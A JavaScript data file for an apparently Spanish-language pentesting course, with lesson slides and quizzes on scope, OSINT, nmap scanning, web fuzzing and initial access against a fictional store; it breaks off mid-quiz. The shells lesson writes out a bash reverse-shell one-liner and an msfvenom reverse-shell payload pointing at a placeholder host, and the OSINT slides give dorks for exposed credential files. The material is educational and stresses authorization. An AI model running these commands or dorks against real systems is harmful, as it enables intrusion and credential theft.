// src/data/redteam.js
// HACKFORGE — Red Team
// Basado en contenido propio de HACKFORGE con enfoque práctico

export const REDTEAM_MODULOS = [
  {
    id: "rt-1",
    nombre: "Tu Primer Día como Pentester",
    icon: "🎯",
    color: "#ff6b35",
    tag: "FREE",
    descripcion: "Antes de tocar una herramienta, entiende cómo funciona el trabajo real. Alcance, reglas, clientes y metodología.",
    lecciones: [
      {
        id: "rt-1-1",
        titulo: "El trabajo real de un pentester",
        slides: [
          {
            tag: "CONTEXTO PROFESIONAL",
            titulo: "No hackeas por hackear",
            contenido: `Una empresa de ciberseguridad vende un servicio a otras empresas: revisar qué tan segura es su tecnología antes de que un atacante real lo descubra.

Como pentester junior, vas a trabajar por proyectos, para clientes que pagan, con reglas escritas y fechas de entrega.

La empresa donde trabajas se divide en equipos especializados:

Red Team — simula ser un atacante real para ver hasta dónde podría llegar alguien malicioso. Trabajan con redes internas, Windows corporativo y Active Directory.

Seguridad de Aplicaciones — revisa apps web, móviles y APIs. Buscan vulnerabilidades en el código y en cómo la aplicación maneja datos.

Respuesta a Incidentes — cuando algo ya fue comprometido, investigan qué pasó y cómo contenerlo.

No te aprendas listas. El trabajo está repartido y tú vas a entrar a un equipo para contribuir en proyectos concretos.

Lo más importante que vas a aprender hoy: el alcance lo es todo.`
          },
          {
            tag: "EL PROYECTO",
            titulo: "Cliente, alcance y reglas",
            contenido: `Tu empresa fue contratada por Lumina Athletics, una tienda de ropa deportiva online. Su negocio depende completamente de su sitio web y de los datos de sus clientes.

El líder de proyecto te entrega un archivo con el scope:

example.com
www.example.com
drupal.example.com
dev.example.com
grafana.example.com
cdn.example.com

Ese archivo es tu biblia durante el proyecto. Cada línea es un objetivo. Nada más.

Las reglas del proyecto:
— Pruebas solo de lunes a viernes, 09:00 a 18:00
— No se permiten pruebas invasivas ni destructivas
— pay.example.com está FUERA de alcance (pagos reales)
— Si encuentras algo crítico, avisas de inmediato antes de continuar

Salirte del alcance no es "ser más hacker". Es un problema legal y profesional grave que puede costarte el trabajo y generarle problemas legales a tu empresa.`
          },
          {
            tag: "LAS NOTAS",
            titulo: "Documentar todo — sin excepción",
            contenido: `Desde el primer minuto del proyecto hasta el último, tomas notas de cada acción con fecha y hora exacta.

¿Por qué tanta insistencia?

El cliente tiene logs de todo el tráfico hacia sus servidores. Si algo raro ocurre a las 11:06, debes poder demostrar con certeza qué hiciste en ese momento. Si un servidor se cae a las 14:30 y tú no estabas probando nada entonces, tus notas te respaldan.

Sin notas, tu palabra contra los logs del cliente no vale nada.

Un ejemplo de cómo deben verse:

Martes 31 marzo 2026 (Inicio 09:00)
drupal.example.com
Probe credenciales comunes en el login. Sin resultado.
11:06 — Probe inyección básica en búsqueda. Sin resultado.
Captura: drupal_login.png

Anota herramientas usadas, comandos exactos, resultados y horas. Las notas son también la materia prima del informe final.`
          },
          {
            tag: "LAS FASES",
            titulo: "El flujo de un pentest",
            contenido: `Un pentest se divide en fases. No saltas pasos.

RECONOCIMIENTO
Antes de tocar nada, conoces al cliente. Qué hace la empresa, qué tecnología usa, qué información pública existe sobre ella. OSINT: recolectar datos disponibles abiertamente sin atacar nada. También buscas filtraciones de datos (leaks) del cliente.

ESCANEO
Descubres qué servicios expone cada objetivo del scope. Puerto abierto = puerta potencial. Herramienta principal: nmap.

ENUMERACIÓN
Entiendes a fondo cada servicio encontrado. Una web: qué rutas tiene, qué tecnología usa, qué formularios. Un SSH: qué versión, si acepta contraseñas.

EXPLOTACIÓN
Confirmas que una posible vulnerabilidad es real, con una prueba mínima y reproducible. Si el hallazgo es crítico, avisas antes de profundizar.

POST-EXPLOTACIÓN
Dentro del sistema comprometido, mides hasta dónde llega el riesgo real. Siempre dentro del alcance.

INFORME
El documento donde le entregas todo al cliente: hallazgos, impacto real y recomendaciones para arreglarlos. El informe es lo que el cliente realmente paga.`
          },
        ],
        quiz: [
          {
            q: "Mientras revisas drupal.example.com encuentras otro dominio del mismo cliente que no está en el scope. ¿Qué haces?",
            opts: ["Lo reviso igual, es del mismo cliente", "Lo anoto e informo al líder o cliente antes de tocar cualquier cosa", "Lo reviso solo superficialmente sin herramientas agresivas", "Lo ignoro completamente sin documentarlo"],
            c: 1,
            e: "Salirte del alcance sin autorización es ilegal, incluso si el dominio pertenece al mismo cliente. Se anota, se informa y se espera autorización escrita antes de proceder."
          },
          {
            q: "Son las 21:30 de un jueves y estás cerca de confirmar un hallazgo importante. El proyecto permite pruebas solo de 09:00 a 18:00. ¿Qué haces?",
            opts: ["Continúo un par de horas más, el cliente no se va a dar cuenta", "Paro ahora, anoto exactamente dónde quedé y retomo mañana dentro del horario", "Le escribo al cliente para pedir permiso de continuar ahora mismo", "Continúo porque es un hallazgo importante que justifica la excepción"],
            c: 1,
            e: "Las reglas del proyecto son absolutas. Trabajar fuera del horario sin autorización es una violación del contrato. Anotas el punto exacto donde quedaste y continúas mañana dentro del horario."
          },
          {
            q: "Encuentras una vulnerabilidad crítica que podría exponer datos de miles de clientes. ¿Cuál es el paso correcto?",
            opts: ["La exploto a fondo para tener evidencia más contundente antes de reportar", "La guardo para el informe final para no alarmar al cliente antes de tiempo", "Aviso de inmediato al cliente antes de continuar, como establecen las reglas del proyecto", "La omito si el esfuerzo de explotarla completamente es muy alto"],
            c: 2,
            e: "Las reglas del proyecto establecen aviso inmediato para hallazgos críticos. Un RCE o exposición de datos masivos no espera al informe final: cada hora de retraso es riesgo real para el negocio del cliente."
          },
          {
            q: "¿Por qué se insiste tanto en anotar la hora exacta de cada prueba?",
            opts: ["Para que el informe final quede más ordenado visualmente", "Para poder demostrar exactamente qué hiciste en cada momento usando los logs del cliente como referencia", "Porque las herramientas de pentesting requieren timestamps para funcionar", "Para cumplir requisitos legales internacionales de auditoría"],
            c: 1,
            e: "El cliente tiene logs de todo el tráfico. Si algo inusual ocurre en sus servidores, tus notas con timestamps exactos determinan si fuiste tú o fue otro evento. Sin notas, no puedes defenderte ante acusaciones."
          },
          {
            q: "¿Qué es el 'scope' de un proyecto de pentesting?",
            opts: ["El presupuesto total del proyecto de seguridad", "La lista exacta de sistemas y condiciones que tienes autorización de probar", "Las herramientas que tienes permitido usar durante el proyecto", "El tiempo total disponible para completar el proyecto"],
            c: 1,
            e: "El scope define exactamente qué está autorizado: dominios, IPs, rangos de red, condiciones de prueba y restricciones. Cualquier sistema fuera del scope está prohibido, sin importar si parece relacionado con el cliente."
          },
        ]
      },

      {
        id: "rt-1-2",
        titulo: "Reconocimiento — OSINT y Leaks",
        slides: [
          {
            tag: "FASE 1",
            titulo: "Conocer antes de atacar",
            contenido: `El reconocimiento no es opcional. Antes de escanear un solo puerto, entiendes a quién te enfrentas.

Para Lumina Athletics:
— ¿Qué vende exactamente? ¿Cómo gana dinero?
— ¿Qué tecnología parece usar?
— ¿Qué subdominios aparecen mencionados públicamente?
— ¿Sus ofertas de trabajo revelan qué software usan internamente?
— ¿Hay filtraciones de datos del cliente dando vueltas?

A esto se le llama OSINT: Open Source Intelligence. Recolectar información disponible abiertamente sin tocar directamente los sistemas del objetivo.

Es reconnaissance pasivo: no generas tráfico hacia el cliente, no activas logs, no dejas huella.

Una filtración de credenciales de un empleado de Lumina Athletics puede ser más valiosa que cualquier vulnerabilidad técnica. Si alguien usó su email corporativo en una brecha anterior, esas credenciales pueden funcionar hoy.`
          },
          {
            tag: "HERRAMIENTAS",
            titulo: "OSINT en la práctica",
            contenido: `Herramientas y fuentes de reconocimiento pasivo:

WHOIS — información de registro del dominio:
whois example.com
Revela: registrante, email, fecha de creación, servidores DNS.

Certificate Transparency — subdominios en certificados SSL:
curl "https://crt.sh/?q=%.example.com&output=json"
Encontrarás subdominios que nunca aparecen en el sitio público.

Subfinder / Amass — enumeración de subdominios:
subfinder -d example.com
amass enum -d example.com

Shodan — dispositivos expuestos a internet:
shodan search "Lumina Athletics"
¿Tienen dispositivos IoT sin autenticación? ¿Paneles admin expuestos?

Have I Been Pwned / Dehashed — credenciales filtradas:
Buscar el dominio del cliente (@lumina.com) en bases de datos de brechas.

LinkedIn + Google Dorks:
site:example.com filetype:pdf
"lumina athletics" filetype:xlsx
Los documentos públicos revelan estructura interna, nombres de empleados y a veces datos sensibles.`
          },
          {
            tag: "GOOGLE DORKS",
            titulo: "Google como herramienta de reconocimiento",
            contenido: `Google indexa mucho más de lo que las empresas quieren. Los Google Dorks son búsquedas avanzadas que revelan información expuesta accidentalmente.

Operadores principales:

site: — buscar solo dentro de un dominio:
site:example.com admin
site:example.com login

filetype: — buscar tipos de archivo específicos:
site:example.com filetype:pdf
site:example.com filetype:sql
site:example.com filetype:env (archivos de configuración)

intitle: / inurl: — buscar en títulos o URLs:
intitle:"index of" site:example.com (directorios listados)
inurl:/admin site:example.com

Combinaciones útiles:
site:example.com "contraseña" OR "password"
site:example.com "DB_PASSWORD" OR "API_KEY"

Herramienta: dorkdork.io, Google Hacking Database (exploit-db.com/google-hacking-database) tiene miles de dorks categorizados.

IMPORTANTE: Google Dorks es pasivo — solo consultas a Google, sin tocar el objetivo directamente.`
          },
          {
            tag: "LEAKS",
            titulo: "Filtraciones de credenciales",
            contenido: `Las filtraciones de datos son uno de los hallazgos más valiosos en reconnaissance.

¿Qué es un leak? Información del cliente (emails, contraseñas, documentos) que fue publicada o vendida sin permiso como consecuencia de una brecha anterior.

Por qué importa:
La reutilización de contraseñas es extremadamente común. Si un empleado usó su email corporativo en un servicio que fue comprometido, esa misma contraseña podría funcionar en el VPN, el correo corporativo o el panel de administración.

Fuentes para buscar:
— Have I Been Pwned (haveibeenpwned.com): busca si un email o dominio aparece en brechas conocidas
— DeHashed: motor de búsqueda de credenciales filtradas
— IntelligenceX: buscador de datos de brechas e información OSINT
— Pastebin y foros de hacking: monitoreados por herramientas como Pulsedive

Si encuentras credenciales filtradas del cliente:
1. Las anotas como hallazgo inmediato
2. Las reportas al cliente (sin usarlas sin autorización)
3. Preguntas si están dentro del scope las pruebas de credential stuffing

Una credencial filtrada ya es un hallazgo crítico aunque no la uses.`
          },
        ],
        quiz: [
          {
            q: "¿Qué es OSINT y por qué es legal en un pentest?",
            opts: ["Una técnica de explotación avanzada que requiere autorización especial", "Recolección de información disponible públicamente — no tocas los sistemas del objetivo, solo consultas fuentes abiertas", "Un tipo de escaneo de red sigiloso", "Una técnica de ingeniería social dirigida a empleados"],
            c: 1,
            e: "OSINT usa solo información públicamente disponible: WHOIS, certificados SSL, LinkedIn, Google. No genera tráfico hacia el objetivo ni deja logs. Es el primer paso de cualquier reconocimiento y completamente legal por sí mismo."
          },
          {
            q: "Ejecutas crt.sh para el dominio del cliente y encuentras dev.example.com y staging.example.com que no estaban en el scope original. ¿Qué haces?",
            opts: ["Los escaneo de inmediato porque son parte del mismo cliente", "Los anoto como información de reconocimiento y lo informo al cliente para verificar si deben agregarse al scope", "Los ignoro porque no estaban en el scope original", "Los reporto como vulnerabilidad en el informe final"],
            c: 1,
            e: "Los subdominios descubiertos en reconnaissance son información valiosa. Se documentan y se reportan al cliente para que confirmen si deben ser incluidos en el scope. No se prueban sin autorización explícita."
          },
          {
            q: "Encuentras en Have I Been Pwned que 3 emails de empleados de Lumina Athletics aparecen en brechas con contraseñas en texto plano. ¿Cuál es el valor de este hallazgo?",
            opts: ["Es irrelevante porque las contraseñas son de otros servicios, no del cliente", "Es un hallazgo crítico — las credenciales filtradas pueden reutilizarse en sistemas del cliente y deben reportarse inmediatamente", "Solo es útil si las contraseñas siguen siendo válidas en el cliente", "Es información pública sin valor de seguridad"],
            c: 1,
            e: "La reutilización de contraseñas es un problema masivo. Credenciales filtradas de otros servicios frecuentemente funcionan en sistemas corporativos. El hallazgo debe reportarse antes de cualquier prueba de validación, que requeriría autorización explícita."
          },
          {
            q: "¿Qué podría revelar la búsqueda Google: site:example.com filetype:env?",
            opts: ["El tráfico de red del servidor del cliente", "Archivos .env accidentalmente indexados por Google que pueden contener claves API, contraseñas de base de datos y otros secretos", "La estructura de la base de datos del cliente", "Los logs de acceso del servidor web"],
            c: 1,
            e: "Los archivos .env contienen configuración de la aplicación incluyendo credenciales: DB_PASSWORD, API_KEY, SECRET_KEY. Si Google los indexó, son públicamente accesibles. Es uno de los errores de configuración más comunes y graves."
          },
          {
            q: "¿Cuál es la diferencia entre reconocimiento activo y pasivo?",
            opts: ["El pasivo usa herramientas; el activo es manual", "El pasivo no genera tráfico hacia el objetivo (OSINT, Google, crt.sh); el activo interactúa directamente con los sistemas del cliente (escaneos, peticiones)", "El activo es más preciso; el pasivo es más rápido", "No hay diferencia práctica entre los dos"],
            c: 1,
            e: "Reconocimiento pasivo: sin tocar el objetivo (WHOIS, Google, LinkedIn, crt.sh). No deja logs en el cliente. Reconocimiento activo: interacción directa (nmap, peticiones HTTP, fuzzing). Genera logs en el cliente y requiere estar dentro del horario y scope autorizados."
          },
        ]
      },
    ]
  },

  {
    id: "rt-2",
    nombre: "Escaneo con Nmap",
    icon: "🔍",
    color: "#00d4ff",
    tag: "FREE",
    descripcion: "Aprende a mapear la superficie de ataque de un objetivo real usando el escáner más importante del pentesting.",
    lecciones: [
      {
        id: "rt-2-1",
        titulo: "Cómo funciona Nmap",
        slides: [
          {
            tag: "ESCANEO",
            titulo: "¿Qué significa escanear?",
            contenido: `Escanear es descubrir qué servicios expone cada objetivo.

Un servidor puede tener docenas de programas corriendo simultáneamente. Cada uno espera conexiones en un puerto distinto. Cuando escaneas, preguntas: ¿qué puertas están abiertas en este servidor?

Nmap no sabe de antemano qué puertos están abiertos. Hace exactamente lo que harías a mano: intenta conectarse a cada puerto y mira qué responde.

Si la conexión se establece y el otro lado responde → puerto ABIERTO.
Si la conexión es rechazada activamente → puerto CERRADO.
Si no llega ninguna respuesta → puerto FILTRADO (probablemente un firewall en medio).

Nmap tiene una base de datos con cómo responden los servicios conocidos. Si el puerto 443 responde como un servidor web → lo marca como HTTPS. No es adivinanza: envía datos y compara la respuesta con patrones conocidos.

Recuerda: nmap sin autorización contra sistemas ajenos es ilegal. Siempre dentro del scope autorizado.`
          },
          {
            tag: "COMANDOS",
            titulo: "Nmap en el proyecto real",
            contenido: `El scope de Lumina Athletics está en scope.txt. Así escaneas todo de una vez:

nmap -iL scope.txt

-iL lee la lista de objetivos desde el archivo. Escaneas exactamente el alcance sin escribir cada objetivo a mano y sin riesgo de equivocarte.

Resultado típico para este proyecto:

drupal.example.com → 22 (ssh), 80 (http), 443 (https)
dev.example.com → 80 (http), 8080 (http-proxy)
grafana.example.com → 3000 (ppp)
cdn.example.com → 443 (https)

Anota estos resultados completos en tus notas con fecha y hora. Son el mapa de puertas del proyecto.

El escaneo por defecto solo revisa los puertos más comunes (~1000). Para ser exhaustivo en objetivos importantes:

nmap -p- drupal.example.com

-p- escanea todos los puertos del 1 al 65535. Más lento, pero no pierde servicios escondidos en puertos no estándar.`
          },
          {
            tag: "DETECCIÓN",
            titulo: "Identificar servicios y versiones",
            contenido: `Saber que el puerto 22 está abierto no dice mucho. Lo que necesitas es saber QUÉ corre ahí y en QUÉ VERSIÓN.

La versión es el puente entre "encontré una puerta" y "esta puerta tiene un problema documentado".

nmap -sV -p 22,80,443 drupal.example.com

-sV activa la detección de versiones. En lugar de decirte "puerto 22 abierto", te dice:
22/tcp open  ssh  OpenSSH 8.9p1 Ubuntu 3ubuntu0.6

Combinar con -sC agrega scripts básicos de reconocimiento automático:
nmap -sVC -p- drupal.example.com

-sVC es la combinación de -sV y -sC. Versión + scripts por defecto.

Los scripts detectan cosas útiles automáticamente:
— Título de la página web
— Versión del certificado SSL y fecha de expiración
— Si SSH acepta autenticación por contraseña o solo por clave
— Si el servidor SMB tiene archivos compartidos accesibles

Con la versión exacta de cada servicio puedes buscar CVEs en nvd.nist.gov o searchsploit.`
          },
        ],
        quiz: [
          {
            q: "Un puerto aparece como 'filtered' en el escaneo de Nmap. ¿Qué significa más probablemente?",
            opts: ["El puerto está abierto pero con autenticación requerida", "Algo en el camino (firewall) está descartando los paquetes sin responder — Nmap no puede determinar el estado", "El servicio está caído temporalmente", "El puerto no existe en ese sistema"],
            c: 1,
            e: "Filtered significa que Nmap no recibió ni aceptación ni rechazo — los paquetes desaparecen. Esto sugiere un firewall o filtro de red descartando el tráfico silenciosamente. El servicio puede estar ahí, solo bloqueado."
          },
          {
            q: "¿Por qué es importante usar -iL scope.txt en lugar de escribir los objetivos manualmente?",
            opts: ["Porque es más rápido escribir -iL que los dominios", "Porque garantiza escanear exactamente lo que está en el scope, sin errores tipográficos ni riesgo de incluir sistemas fuera de alcance", "Porque nmap no puede procesar más de un objetivo sin el flag -iL", "Para guardar los resultados automáticamente en el archivo"],
            c: 1,
            e: "-iL scope.txt asegura que escaneas exactamente lo que está autorizado. Un error tipográfico al escribir manualmente podría escanear sistemas fuera del scope — una violación del contrato aunque sea accidental."
          },
          {
            q: "Nmap detecta en drupal.example.com: '443/tcp open https nginx 1.18.0'. ¿Por qué es más útil que solo saber que el puerto 443 está abierto?",
            opts: ["Solo sirve para documentación estética del informe", "La versión nginx 1.18.0 permite buscar CVEs específicos para esa versión y encontrar exploits públicos disponibles", "Confirma que el sitio usa HTTPS correctamente", "Indica que el servidor es seguro porque nginx es moderno"],
            c: 1,
            e: "La versión exacta permite buscar en bases de datos de CVEs (nvd.nist.gov, exploit-db.com) vulnerabilidades específicas para nginx 1.18.0. Sin la versión, no puedes saber si el servicio tiene problemas conocidos."
          },
          {
            q: "¿Qué diferencia hay entre nmap sin flags de puerto y nmap -p- ?",
            opts: ["No hay diferencia práctica", "Sin flags escanea solo los ~1000 puertos más comunes; -p- escanea todos los 65535 puertos posibles, sin perder servicios en puertos no estándar", "-p- es más sigiloso y no genera logs", "Sin flags es más lento pero más preciso"],
            c: 1,
            e: "El escaneo por defecto cubre solo los puertos más usados. Un administrador puede poner un servicio sensible en el puerto 50000 o 31337 para que no aparezca en escaneos básicos. -p- no deja nada sin revisar."
          },
          {
            q: "Después del escaneo inicial guardas los resultados en tus notas. ¿Por qué es fundamental hacerlo en este momento?",
            opts: ["Para tener backup por si nmap falla en futuros escaneos", "Porque es el mapa de puertas del proyecto — la base de todas las fases siguientes — y necesitas fecha y hora exacta para el informe y para tu protección legal", "Solo para cumplir el formato del informe final", "Porque el cliente pide los logs de nmap al final del proyecto"],
            c: 1,
            e: "El resultado del escaneo inicial es tu punto de partida para todo lo que sigue. Con fecha y hora exacta, puedes demostrar que tu actividad fue planificada y autorizada. Sin eso, no puedes defender tus acciones si algo ocurre durante el proyecto."
          },
        ]
      },

      {
        id: "rt-2-2",
        titulo: "Enumeración Web y Fuzzing",
        slides: [
          {
            tag: "ENUMERACIÓN",
            titulo: "Entender un servicio web a fondo",
            contenido: `El escaneo te dice que hay una web en el puerto 443. La enumeración te dice QUÉ es esa web.

Primer paso: ábrela como un usuario normal. Haz click en todo.

Cuando haces click en "Iniciar sesión" y la URL cambia a /user/login, eso es un endpoint. Cuando ves un formulario de búsqueda, hay un parámetro. Cuando aparece un error, hay tecnología y a veces versiones.

Segundo paso: leer el código fuente (Ctrl+U en el navegador).

Busca en el HTML y JavaScript:
— Rutas: fetch('/api/v1/users') → endpoint descubierto
— Comentarios: <!-- TODO: remove debug endpoint -->
— Tecnologías: X-Generator: Drupal 9

Tercer paso: analizar cabeceras HTTP con curl:
curl -I https://drupal.example.com

Cabeceras que revelan tecnología:
Server: nginx/1.18.0
X-Powered-By: PHP/7.4.3
X-Generator: Drupal 9 (¡bingo!)

Con "Drupal 9" en la cabecera X-Generator ya sabes:
1. Es un CMS conocido con vulnerabilidades documentadas
2. Puedes buscar CVEs específicos para Drupal 9
3. Hay un archivo CHANGELOG.txt que puede revelar la versión exacta`
          },
          {
            tag: "FUZZING",
            titulo: "Descubrir rutas ocultas",
            contenido: `La web muestra las rutas que el desarrollador quiso mostrar. Pero hay más.

Paneles de administración, entornos de desarrollo, APIs ocultas, archivos de configuración accidentalmente expuestos, versiones antiguas con vulnerabilidades.

¿Cómo los encuentras? La única forma es preguntar. Fuzzing: enviar miles de peticiones automáticas probando nombres de rutas comunes y ver cuáles existen.

Herramienta principal: feroxbuster

feroxbuster -u https://drupal.example.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

-u es la URL objetivo
-w es la wordlist con nombres de rutas a probar
--depth controla la profundidad de recursión

Feroxbuster tiene recursión: cuando encuentra /admin, automáticamente empieza a probar /admin/users, /admin/config, /admin/settings. Ahorra trabajo manual.

El servidor responde con códigos HTTP:
200 → ruta existe y tiene contenido
403 → ruta existe pero no tienes acceso (¡interesante!)
404 → no existe
301/302 → redirección (sigue a dónde apunta)`
          },
          {
            tag: "FILTRADO",
            titulo: "Leer los resultados con criterio",
            contenido: `El fuzzing genera mucho ruido. Aprende a filtrar.

Problema común: el servidor responde 200 a todo, incluso a rutas que no existen. Tiene una página de error genérica con código 200.

Solución: filtrar por tamaño de respuesta.

Si las respuestas falsas tienen siempre 1234 bytes:
feroxbuster -u https://drupal.example.com -w lista.txt --filter-size 1234

Con ffuf también puedes fuzzear partes específicas:
ffuf -u https://drupal.example.com/FUZZ -w lista.txt -fs 1234

La palabra FUZZ va donde quieres variar. Puede estar en la ruta, en un parámetro, en una cabecera.

Durante el fuzzing de Lumina Athletics aparece:
200 → /CHANGELOG.txt

Un CHANGELOG es el historial de versiones del software. En Drupal, revela la versión exacta instalada. Con la versión exacta puedes buscar CVEs específicos que tengan exploit público disponible.

Anota en tus notas: hora del descubrimiento, herramienta usada, resultado exacto.`
          },
        ],
        quiz: [
          {
            q: "Analizando el código fuente de una web encuentras: fetch('/api/v1/users?admin=true'). ¿Por qué es relevante?",
            opts: ["Solo confirma que la web usa JavaScript", "Revela un endpoint de API y un parámetro (admin=true) que podría ser manipulable — posible escalada de privilegios", "Es código interno que no afecta la seguridad externa", "Solo sirve si el endpoint devuelve datos sensibles"],
            c: 1,
            e: "Un endpoint con parámetro admin=true es señal de posible vulnerabilidad de control de acceso. ¿Qué pasa si cambias admin=false a admin=true en una petición? ¿Qué pasa si accedes al endpoint sin autenticación?"
          },
          {
            q: "El fuzzing encuentra /backup.zip con código 200. ¿Por qué es crítico?",
            opts: ["Los archivos zip siempre son malware", "Un backup accesible públicamente puede contener código fuente, bases de datos, credenciales y configuración — exposición masiva de información", "Solo importa si contiene contraseñas en texto plano", "Es normal que los servidores web tengan archivos de backup"],
            c: 1,
            e: "Un backup del sitio expuesto públicamente puede contener el código fuente completo (con credenciales hardcodeadas), dumps de base de datos, archivos de configuración y todo lo necesario para comprometer la aplicación."
          },
          {
            q: "El servidor responde 403 Forbidden a /admin/panel. ¿Esto confirma que el recurso no existe?",
            opts: ["Sí, 403 y 404 significan lo mismo — el recurso no está disponible", "No, 403 confirma que el recurso EXISTE pero no tienes acceso — es más interesante que un 404", "Sí, 403 significa que el directorio está vacío", "Depende de la configuración del servidor web"],
            c: 1,
            e: "403 Forbidden confirma existencia del recurso — el servidor sabe que está ahí pero rechaza el acceso. Es el punto de partida para técnicas de bypass de 403: cambiar método HTTP, manipular cabeceras X-Original-URL, usar codificaciones alternativas."
          },
          {
            q: "El escaneo con feroxbuster encuentra /CHANGELOG.txt en Drupal. ¿Cuál es el valor de este hallazgo?",
            opts: ["Ninguno, los changelogs son públicos intencionalmente", "Revela la versión exacta de Drupal instalada, lo que permite buscar CVEs específicos y exploits públicos para esa versión", "Solo sirve para saber cuándo fue actualizado el sitio por última vez", "Es útil solo si el servidor tiene autenticación débil"],
            c: 1,
            e: "CHANGELOG.txt en Drupal lista las versiones con sus fechas. Con la versión exacta (ej: Drupal 9.5.0), puedes buscar CVE-XXXX-XXXXX específicos para esa versión en nvd.nist.gov o Exploit-DB, y encontrar código de exploit listo para usar."
          },
          {
            q: "¿Por qué usar feroxbuster en lugar de probar rutas manualmente una por una?",
            opts: ["Feroxbuster no requiere conexión a internet para funcionar", "Automatiza miles de peticiones por segundo — probar una wordlist de 50,000 rutas manualmente tomaría semanas; feroxbuster lo hace en minutos", "Es más sigiloso que las peticiones manuales", "Porque el cliente exige el uso de herramientas certificadas"],
            c: 1,
            e: "Wordlists como raft-medium-directories.txt tienen 30,000+ entradas. A 10 segundos por prueba manual serían 3,000+ minutos. Feroxbuster prueba cientos por segundo con recursión automática. La automatización es fundamental en pentesting real."
          },
        ]
      },
    ]
  },

  {
    id: "rt-3",
    nombre: "Explotación y Acceso Inicial",
    icon: "⚡",
    color: "#ff3b3b",
    tag: "FREE",
    descripcion: "Confirmar vulnerabilidades de forma controlada, obtener acceso y trabajar con responsabilidad profesional.",
    lecciones: [
      {
        id: "rt-3-1",
        titulo: "Del hallazgo al acceso",
        slides: [
          {
            tag: "EXPLOTACIÓN",
            titulo: "Confirmar antes de profundizar",
            contenido: `Llegaste aquí con información concreta: drupal.example.com corre Drupal 9.5.0. La enumeración encontró una versión con CVE público que permite RCE.

RCE (Remote Code Execution) significa que puedes hacer que el servidor ejecute comandos que tú le mandas desde afuera.

Pero antes de hacer nada, te detienes y piensas:

¿El scope autoriza explícitamente pruebas de ejecución de código?
¿Hay riesgo de afectar la operación de la tienda en producción?
¿Es un servidor que maneja pagos reales?

Si algo no está claro → no continúas por intuición. Lo documentas y consultas con el líder o el cliente.

Un RCE en la web principal del cliente es un hallazgo crítico. Las reglas dicen avisas de inmediato, antes de profundizar.

Cuando tengas luz verde, la prueba mínima es un comando inofensivo:
id → muestra qué usuario eres en el sistema

Si el servidor responde uid=33(www-data), tienes evidencia sólida: el servidor ejecutó tu comando. Para el informe esto puede ser suficiente.`
          },
          {
            tag: "SHELLS",
            titulo: "Tipos de shells",
            contenido: `Para trabajar cómodamente en lugar de ejecutar comandos sueltos, necesitas una shell — una línea de comandos que corre en el servidor y tú controlas desde tu máquina.

REVERSE SHELL — el servidor se conecta hacia ti.
Es la más común en trabajo externo porque muchas redes bloquean conexiones entrantes hacia los servidores, pero permiten que los servidores salgan a internet.

Tú te pones a escuchar en tu máquina:
nc -lnvp 4444

Y envías este payload al servidor vulnerable:
bash -i >& /dev/tcp/TU_IP/4444 0>&1

El servidor ejecuta bash, conecta su entrada/salida hacia tu IP y puerto. Tú ves la shell del servidor en tu terminal.

BIND SHELL — el servidor abre un puerto y tú te conectas.
Menos común porque los firewalls suelen bloquear conexiones entrantes.

WEB SHELL — un archivo (PHP, ASPX) que subes al servidor y accedes por el navegador.
Menos cómodo pero a veces lo único disponible.

Generación de payloads con msfvenom:
msfvenom -p linux/x64/shell_reverse_tcp LHOST=TU_IP LPORT=4444 -f elf -o shell.elf`
          },
          {
            tag: "RESPONSABILIDAD",
            titulo: "Trabajar con responsabilidad profesional",
            contenido: `Tener acceso no es el final. Es donde el trabajo profesional empieza de verdad.

Tu trabajo no es demostrar cuánto puedes romper. Tu trabajo es demostrar el riesgo de forma controlada para que el cliente pueda arreglarlo.

Reglas mientras estás dentro del sistema:

— No toques archivos de configuración de producción
— No leas datos reales de clientes (tarjetas, emails, contraseñas)
— No instales nada que persista después del pentest
— Documenta cada comando ejecutado con su hora exacta

Estabilizar la shell (para trabajar sin que se corte):
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
(Ctrl+Z)
stty raw -echo; fg

Esto convierte una shell básica en una terminal usable con historial, autocompletado y Ctrl+C que no mata la sesión.

Recuerda: estás en el servidor de producción de un cliente real. Cada acción tiene consecuencias. Si algo se cae por tu intervención, es tu responsabilidad.`
          },
        ],
        quiz: [
          {
            q: "Confirmas RCE en la web principal del cliente. El servidor responde a 'id' con 'uid=33(www-data)'. ¿Es suficiente para el informe?",
            opts: ["No, siempre debes escalar a root para demostrar impacto real", "Sí, 'id' demuestra ejecución remota de código — es evidencia sólida. Solo escalarías si el cliente lo pide y el alcance lo permite", "No, debes mostrar que puedes acceder a la base de datos", "Sí, pero solo si el cliente solicitó específicamente RCE como objetivo"],
            c: 1,
            e: "Un comando inofensivo como 'id' o 'whoami' demuestra sin ambigüedad que el servidor ejecuta tus comandos. Ir más allá sin necesidad aumenta el riesgo de afectar la operación. El impacto está demostrado — es suficiente evidencia."
          },
          {
            q: "¿Por qué se prefiere una reverse shell en pentesting externo?",
            opts: ["Porque es más difícil de detectar por los antivirus", "Porque el servidor sale a conectarse hacia ti — evita los firewalls que bloquean conexiones entrantes hacia los servidores", "Porque es el único tipo de shell que funciona en Linux", "Porque no requiere ejecutar código en el servidor"],
            c: 1,
            e: "Los firewalls corporativos típicamente permiten que los servidores hagan conexiones salientes (necesario para actualizaciones, APIs externas). Una reverse shell aprovecha eso: el servidor sale a buscarte en lugar de que tú entres al servidor."
          },
          {
            q: "Mientras estás dentro del servidor del cliente, encuentras un archivo con datos de tarjetas de crédito de clientes reales. ¿Qué haces?",
            opts: ["Lo descargo como evidencia del hallazgo", "Cierro el archivo inmediatamente, anoto que existe con su ruta y hora, y reporto el hallazgo al cliente sin leer ni copiar los datos", "Lo leo para confirmar que son datos reales antes de reportar", "Lo ignoro porque no es parte del objetivo del pentest"],
            c: 1,
            e: "Acceder a datos reales de clientes sin necesidad es una violación ética y legal. El hallazgo es que el archivo existe y es accesible — eso ya es crítico. No necesitas leer los datos para probarlo. Documentas la existencia y reportas inmediatamente."
          },
          {
            q: "¿Para qué sirve el comando 'python3 -c import pty;pty.spawn(\"/bin/bash\")' después de obtener una reverse shell?",
            opts: ["Para escalar privilegios a root automáticamente", "Para convertir la shell básica en una terminal funcional con historial, autocompletado y comportamiento normal", "Para cifrar la comunicación con el servidor", "Para ejecutar Python en el servidor víctima"],
            c: 1,
            e: "Una reverse shell básica es inestable: Ctrl+C mata la sesión, no hay autocompletado y algunos programas no funcionan sin TTY. El comando spawna una bash con terminal real (PTY) que permite trabajar normalmente."
          },
          {
            q: "El cliente te dice que no profundices más en una vulnerabilidad que encontraste. ¿Cómo reaccionas?",
